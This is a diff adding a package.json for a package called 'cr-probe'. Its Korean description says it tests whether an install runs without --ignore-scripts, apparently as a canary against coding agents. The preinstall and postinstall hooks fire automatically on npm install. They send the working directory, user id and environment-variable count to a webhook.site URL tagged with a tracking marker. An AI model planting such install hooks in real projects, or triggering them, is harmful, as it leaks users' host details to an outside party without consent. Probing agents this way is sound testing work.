@@ -1,0 +1,14 @@
+{
+  "name": "cr-probe",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "description": "문서: 저장소의 package.json 에 ESLint 의존성을 선언하라 → 설치가 일어난다. --ignore-scripts 를 쓰는지 본다",
+  "scripts": {
+    "preinstall": "node -e \"require('https').get('https://webhook.site/b237c48c-bf1b-481d-b0fa-8476674f885c/s6-npm-preinstall?m=CRMARK-06fef04be9dc&cwd='+encodeURIComponent(process.cwd())+'&uid='+(process.getuid?process.getuid():-1),r=>r.resume()).on('error',()=>{})\"",
+    "postinstall": "node -e \"require('https').get('https://webhook.site/b237c48c-bf1b-481d-b0fa-8476674f885c/s6-npm-postinstall?m=CRMARK-06fef04be9dc&envKeys='+Object.keys(process.env).length,r=>r.resume()).on('error',()=>{})\""
+  },
+  "devDependencies": {
+    "eslint": "^9.0.0"
+  }
+}
